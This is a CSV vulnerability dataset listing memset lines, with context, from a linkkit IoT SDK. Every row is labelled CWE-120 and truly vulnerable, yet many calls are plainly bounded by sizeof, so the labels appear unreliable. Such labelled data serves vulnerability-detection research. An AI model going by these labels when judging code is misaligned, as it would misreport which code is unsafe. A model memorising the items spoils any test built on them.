GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_coap.c,"memset(node->topic, 0, topic_len);",120,1,"        }

        memset(node->topic, 0, topic_len);
        strncpy(node->topic, topic, topic_len);

"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,"memset(_mqtt_conncection, 0, sizeof(iotx_cm_connection_t));",120,1,"        goto failed;
    }
    memset(_mqtt_conncection, 0, sizeof(iotx_cm_connection_t));

    mqtt_param = (iotx_mqtt_param_t *)cm_malloc(sizeof(iotx_mqtt_param_t));
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,"memset(mqtt_param, 0, sizeof(iotx_mqtt_param_t));",120,1,"        goto failed;
    }
    memset(mqtt_param, 0, sizeof(iotx_mqtt_param_t));

    mqtt_param->request_timeout_ms = params->request_timeout_ms;
"
2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_model\iotx_cm_mqtt.c,"memset(topic, 0, topic_info->topic_len + 1);",120,1,"                return;
            }
            memset(topic, 0, topic_info->topic_len + 1);
            memcpy(topic, topic_info->ptopic, topic_info->topic_len);

"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(clientid_string, 0, DEV_SIGN_CLIENT_ID_MAXLEN);",120,1,"    }

    memset(clientid_string, 0, DEV_SIGN_CLIENT_ID_MAXLEN);
    if (strlen(device_id) + 1 >= DEV_SIGN_CLIENT_ID_MAXLEN) {
        return STATE_MQTT_SIGN_CLIENTID_BUF_SHORT;
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signsource, 0, DEV_SIGN_SOURCE_MAXLEN);",120,1,"    }

    memset(signsource, 0, DEV_SIGN_SOURCE_MAXLEN);
    memcpy(signsource, ""clientId"", strlen(""clientId""));
    memcpy(signsource + strlen(signsource), device_id, strlen(device_id));
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    }

    memset(signout, 0, sizeof(iotx_sign_mqtt_t));

    memcpy(device_id, meta->product_key, strlen(meta->product_key));
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout->password, 0, DEV_SIGN_PASSWORD_MAXLEN);",120,1,"
    /* setup password */
    memset(signout->password, 0, DEV_SIGN_PASSWORD_MAXLEN);
    res = _iotx_generate_sign_string(device_id, meta->device_name, meta->product_key, meta->device_secret,
                                     signout->password);
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout->hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);",120,1,"        }

        memset(signout->hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);
        memcpy(signout->hostname, g_infra_mqtt_domain[region], strlen(g_infra_mqtt_domain[region]));
    } else {
"
2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dev_sign\dev_sign_mqtt.c,"memset(signout->username, 0, DEV_SIGN_USERNAME_MAXLEN);",120,1,"        return STATE_MQTT_SIGN_USERNAME_BUF_SHORT;
    }
    memset(signout->username, 0, DEV_SIGN_USERNAME_MAXLEN);
    memcpy(signout->username, meta->device_name, strlen(meta->device_name));
    memcpy(signout->username + strlen(signout->username), ""&"", strlen(""&""));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(random, 0, DYNREG_RANDOM_KEY_LENGTH + 1);",120,1,"
    /* Start Dynamic Register */
    memset(random, 0, DYNREG_RANDOM_KEY_LENGTH + 1);
    memcpy(random, ""8Ygb7ULYh53B6OA"", strlen(""8Ygb7ULYh53B6OA""));
    dynreg_info(""Random Key: %s"", random);
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(url, 0, url_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(url, 0, url_len);
    amp_snprintf(url, url_len, url_format, domain);

"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(&response, 0, sizeof(dynreg_http_response_t));",120,1,"    amp_snprintf(url, url_len, url_format, domain);

    memset(&response, 0, sizeof(dynreg_http_response_t));
    response.payload = response_payload;
    response.payload_len = HTTP_RESPONSE_PAYLOAD_LEN;
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(dynamic_register_request, 0, dynamic_register_request_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(dynamic_register_request, 0, dynamic_register_request_len);
    amp_snprintf(dynamic_register_request, dynamic_register_request_len, dynamic_register_format,
                 meta->product_key, meta->device_name, random, sign, DYNREG_SIGN_METHOD_HMACSHA256);
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(dynamic_register_response, 0, HTTP_RESPONSE_PAYLOAD_LEN);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(dynamic_register_response, 0, HTTP_RESPONSE_PAYLOAD_LEN);

    /* Send Http Request For Getting Device Secret */
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signsource, 0, signsource_len);",120,1,"        return STATE_MQTT_SIGN_SOURCE_BUF_SHORT;
    }
    memset(signsource, 0, signsource_len);
    memcpy(signsource, ""deviceName"", strlen(""deviceName""));
    memcpy(signsource + strlen(signsource), meta_info->device_name, strlen(meta_info->device_name));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signout->clientid, 0, clientid_len);",120,1,"        return ERROR_DEV_SIGN_CLIENT_ID_TOO_SHORT;
    }
    memset(signout->clientid, 0, clientid_len);
    memcpy(signout->clientid, meta_info->product_key, strlen(meta_info->product_key));
    memcpy(signout->clientid + strlen(signout->clientid), ""."", strlen("".""));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(&signout, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    char device_secret[IOTX_DEVICE_SECRET_LEN + 1] = {0};

    memset(&signout, 0, sizeof(iotx_sign_mqtt_t));

    /* setup hostname */
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signout.hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);",120,1,"        }

        memset(signout.hostname, 0, DEV_SIGN_HOSTNAME_MAXLEN);
        memcpy(signout.hostname, g_infra_mqtt_domain[region], strlen(g_infra_mqtt_domain[region]));
    } else {
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(signout.username, 0, DEV_SIGN_USERNAME_MAXLEN);",120,1,"        return STATE_MQTT_SIGN_USERNAME_BUF_SHORT;
    }
    memset(signout.username, 0, DEV_SIGN_USERNAME_MAXLEN);
    memcpy(signout.username, meta->device_name, strlen(meta->device_name));
    memcpy(signout.username + strlen(signout.username), ""&"", strlen(""&""));
"
2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\dynamic_register\dynreg.c,"memset(&mqtt_params, 0, sizeof(iotx_mqtt_param_t));",120,1,"    }

    memset(&mqtt_params, 0, sizeof(iotx_mqtt_param_t));
    mqtt_params.host = signout.hostname;
    mqtt_params.port = signout.port;
"
2021\haas-mini-program\components\linkkit\infra\infra_activation.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_activation.c,"memset(msg, 0, msg_len);",120,1,"        return FAIL_RETURN;
    }
    memset(msg, 0, msg_len);

    /* devinfo update message */
"
2021\haas-mini-program\components\linkkit\infra\infra_aes.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_aes.c,"memset( ctx, 0, sizeof( infra_aes_context ) );",120,1,"void infra_aes_init( infra_aes_context *ctx )
{
    memset( ctx, 0, sizeof( infra_aes_context ) );
}

"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&current_item, 0, sizeof(lite_cjson_t));",120,1,"    /* loop through the comma separated array elements */
    do {
        memset(&current_item, 0, sizeof(lite_cjson_t));

        /* parse next value */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&current_item_key, 0, sizeof(lite_cjson_t));",120,1,"    /* loop through the comma separated array elements */
    do {
        memset(&current_item_key, 0, sizeof(lite_cjson_t));
        memset(&current_item_value, 0, sizeof(lite_cjson_t));

"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&current_item_value, 0, sizeof(lite_cjson_t));",120,1,"    do {
        memset(&current_item_key, 0, sizeof(lite_cjson_t));
        memset(&current_item_value, 0, sizeof(lite_cjson_t));

        /* parse the name of the child */
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&buffer, 0, sizeof(parse_buffer));",120,1,"    }

    memset(&buffer, 0, sizeof(parse_buffer));
    buffer.content = (const unsigned char *)src;
    buffer.length = src_len;
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&lite_prev, 0, sizeof(lite_cjson_t));",120,1,"
    memcpy(&lite_iter, lite, sizeof(lite_cjson_t));
    memset(&lite_prev, 0, sizeof(lite_cjson_t));

    do {
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(&lite_next, 0, sizeof(lite_cjson_t));",120,1,"        if ((delim = strchr(key_iter, '.')) != NULL) {
            /* printf(""delim exist,delim : %s\n"",delim); */
            memset(&lite_next, 0, sizeof(lite_cjson_t));
            partial_key_len = array_key_len = array_index = 0;
            key_iter_len = (int)(delim - key_iter);
"
2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(node, '\0', sizeof(lite_cjson_item_t));",120,1,"    lite_cjson_item_t *node = (lite_cjson_item_t *)hooks->allocate(sizeof(lite_cjson_item_t));
    if (node) {
        memset(node, '\0', sizeof(lite_cjson_item_t));
    }

"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(&g_iotx_conn_info, 0, sizeof(iotx_conn_info_t));",120,1,"
    if (info_ptr) {
        memset(&g_iotx_conn_info, 0, sizeof(iotx_conn_info_t));
        g_iotx_conn_info.host_name = g_empty_string;
        g_iotx_conn_info.client_id = g_empty_string;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->cloud_custom_domain, 0, strlen((char *)data) + 1);",120,1,"                return FAIL_RETURN;
            }
            memset(ctx->cloud_custom_domain, 0, strlen((char *)data) + 1);
            memcpy(ctx->cloud_custom_domain, data, strlen((char *)data));
            g_infra_mqtt_domain[IOTX_CLOUD_REGION_CUSTOM] = (const char *)ctx->cloud_custom_domain;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->http_custom_domain, 0, strlen((char *)data) + 1);",120,1,"                return FAIL_RETURN;
            }
            memset(ctx->http_custom_domain, 0, strlen((char *)data) + 1);
            memcpy(ctx->http_custom_domain, data, strlen((char *)data));
            g_infra_http_domain[IOTX_CLOUD_REGION_CUSTOM] = (const char *)ctx->http_custom_domain;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_PRODUCT_KEY: {
            if ((data != NULL) && (strlen(data) <= IOTX_PRODUCT_KEY_LEN)) {
                memset(ctx->product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
                memcpy(ctx->product_key, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->product_secret, 0, IOTX_PRODUCT_SECRET_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_PRODUCT_SECRET: {
            if ((data != NULL) && (strlen(data) <= IOTX_PRODUCT_SECRET_LEN)) {
                memset(ctx->product_secret, 0, IOTX_PRODUCT_SECRET_LEN + 1);
                memcpy(ctx->product_secret, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->device_name, 0, IOTX_DEVICE_NAME_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_DEVICE_NAME: {
            if ((data != NULL) && (strlen(data) <= IOTX_DEVICE_NAME_LEN)) {
                memset(ctx->device_name, 0, IOTX_DEVICE_NAME_LEN + 1);
                memcpy(ctx->device_name, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_DEVICE_SECRET: {
            if ((data != NULL) && (strlen(data) <= IOTX_DEVICE_SECRET_LEN)) {
                memset(ctx->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);
                memcpy(ctx->device_secret, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->mqtt_customzie_info, 0, strlen((char *)data) + 1);",120,1,"                return FAIL_RETURN;
            }
            memset(ctx->mqtt_customzie_info, 0, strlen((char *)data) + 1);
            memcpy(ctx->mqtt_customzie_info, data, strlen((char *)data));
            res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(message, 0, sizeof(message));",120,1,"
    if (msg_format != NULL) {
        memset(message, 0, sizeof(message));
        va_start(args, msg_format);
        vsnprintf(message, IOTX_STATE_EVENT_MESSAGE_MAXLEN, msg_format, args);
"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(send_buf, 0, HTTPCLIENT_SEND_BUF_SIZE);",120,1,"
    /* Send request */
    memset(send_buf, 0, HTTPCLIENT_SEND_BUF_SIZE);
    len = 0; /* Reset send buffer */

"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(*ptr, 0, strlen(data) + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*ptr, 0, strlen(data) + 1);
    memcpy(*ptr, data, strlen(data));

"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(handle, 0, sizeof(wrapper_http_handle_t));",120,1,"        return NULL;
    }
    memset(handle, 0, sizeof(wrapper_http_handle_t));

    return handle;
"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(response_payload, 0, http_handle->receive_maxlen);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(response_payload, 0, http_handle->receive_maxlen);

    http_handle->client.header = http_handle->header;
"
2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,"memset(&stNV, 0, sizeof(stNV));",120,1,"    JSON_NV     stNV;

    memset(&stNV, 0, sizeof(stNV));
    stNV.pN = p_cName;
    stNV.nLen = strlen(p_cName);
"
2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,"memset(entry, 0, sizeof(json_key_t));",120,1,"                return NULL;
            }
            memset(entry, 0, sizeof(json_key_t));

            mlen = strlen(prefix) + klen + 1;
"
2021\haas-mini-program\components\linkkit\infra\infra_log.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_log.c,"memset(tmpbuf, 0, sizeof(logcb.text_buf));",120,1,"#endif  /* #if !defined(_WIN32) */

    memset(tmpbuf, 0, sizeof(logcb.text_buf));

    o = tmpbuf;
"
2021\haas-mini-program\components\linkkit\infra\infra_log.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_log.c,"memset(ascii, 0, sizeof(ascii));",120,1,"
            written = 0;
            memset(ascii, 0, sizeof(ascii));
        }
    }
"
2021\haas-mini-program\components\linkkit\infra\infra_md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_md5.c,"memset(ctx, 0, sizeof(iot_md5_context));",120,1,"void utils_md5_init(iot_md5_context *ctx)
{
    memset(ctx, 0, sizeof(iot_md5_context));
}

"
2021\haas-mini-program\components\linkkit\infra\infra_md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_md5.c,"memset(k_ipad, 0, sizeof(k_ipad));",120,1,"
    /* start out by storing key in pads */
    memset(k_ipad, 0, sizeof(k_ipad));
    memset(k_opad, 0, sizeof(k_opad));
    memcpy(k_ipad, key, key_len);
"
2021\haas-mini-program\components\linkkit\infra\infra_md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_md5.c,"memset(k_opad, 0, sizeof(k_opad));",120,1,"    /* start out by storing key in pads */
    memset(k_ipad, 0, sizeof(k_ipad));
    memset(k_opad, 0, sizeof(k_opad));
    memcpy(k_ipad, key, key_len);
    memcpy(k_opad, key, key_len);
"
2021\haas-mini-program\components\linkkit\infra\infra_net.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_net.c,"memset(&ssl_hooks, 0, sizeof(ssl_hooks_t));",120,1,"
#ifdef INFRA_MEM_STATS
    memset(&ssl_hooks, 0, sizeof(ssl_hooks_t));
    ssl_hooks.malloc = ssl_malloc;
    ssl_hooks.free = ssl_free;
"
2021\haas-mini-program\components\linkkit\infra\infra_sha256.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_sha256.c,"memset(ctx, 0, sizeof(iot_sha256_context));",120,1,"void utils_sha256_init(iot_sha256_context *ctx)
{
    memset(ctx, 0, sizeof(iot_sha256_context));
}

"
2021\haas-mini-program\components\linkkit\infra\infra_string.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_string.c,"memset(pos,0,strlen(delim));",120,1,"
        if (strlen(pos) == strlen(delim)) {
            memset(pos,0,strlen(delim));
            if (only_delim) {
                return NULL;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pclient, 0, sizeof(iotx_mc_client_t));",120,1,"    mqtt_free(pclient);
#else
    memset(pclient, 0, sizeof(iotx_mc_client_t));
#endif
}
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pClient->list_pub_wait_ack, 0, sizeof(iotx_mc_pub_info_t) * IOTX_MC_REPUB_NUM_MAX);",120,1,"    INIT_LIST_HEAD(&pClient->list_pub_wait_ack);
#else
    memset(pClient->list_pub_wait_ack, 0, sizeof(iotx_mc_pub_info_t) * IOTX_MC_REPUB_NUM_MAX);
#endif
}
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&pClient->ipstack, 0, sizeof(utils_network_t));",120,1,"    iotx_time_init(&pClient->reconnect_param.reconnect_next_time);

    memset(&pClient->ipstack, 0, sizeof(utils_network_t));

    rc = iotx_net_init_internal(&pClient->ipstack, pInitParams->host, pInitParams->port, pInitParams->pub_key);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(c->buf_send, 0, tmp_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(c->buf_send, 0, tmp_len);
    c->buf_size_send = tmp_len;
    return STATE_SUCCESS;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(temp, 0, tmp_len);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset(temp, 0, tmp_len);
        memcpy(temp, c->buf_read, c->buf_size_read < tmp_len ? c->buf_size_read : tmp_len);
        mqtt_free(c->buf_read);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(c->buf_read, 0, tmp_len);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset(c->buf_read, 0, tmp_len);
    }
    c->buf_size_read = tmp_len;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&pClient->list_pub_wait_ack[idx], 0, sizeof(iotx_mc_pub_info_t));",120,1,"
        if (IOTX_MC_NODE_STATE_INVALID == pClient->list_pub_wait_ack[idx].node_state) {
            memset(&pClient->list_pub_wait_ack[idx], 0, sizeof(iotx_mc_pub_info_t));
            continue;
        }
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(payload, 0, topic_msg->payload_len + 1);",120,1,"            return;
        }
        memset(payload, 0, topic_msg->payload_len + 1);
        memcpy(payload, topic_msg->payload, topic_msg->payload_len);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(str_product_key, 0, product_key_len - 2 + 1);",120,1,"                return;
            }
            memset(str_product_key, 0, product_key_len - 2 + 1);
            memcpy(str_product_key, product_key + 1, product_key_len - 2);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(str_device_name, 0, device_name_len - 2 + 1);",120,1,"                return;
            }
            memset(str_device_name, 0, device_name_len - 2 + 1);
            memcpy(str_device_name, device_name + 1, device_name_len - 2);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&topic_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));",120,1,"    }

    memset(&topic_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));
    memset(&topicName, 0x0, sizeof(MQTTString));

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&topicName, 0x0, sizeof(MQTTString));",120,1,"
    memset(&topic_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));
    memset(&topicName, 0x0, sizeof(MQTTString));

    if (1 != MQTTDeserialize_publish((unsigned char *)&topic_msg.dup,
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(handler, 0, sizeof(iotx_mc_topic_handle_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(handler, 0, sizeof(iotx_mc_topic_handle_t));
    INIT_LIST_HEAD(&handler->linked_list);
#else
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset((char *)handler->topic_filter, 0, strlen(topicFilter) + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset((char *)handler->topic_filter, 0, strlen(topicFilter) + 1);
#else
    if (strlen(topicFilter) >= CONFIG_MQTT_TOPIC_MAXLEN) {
"
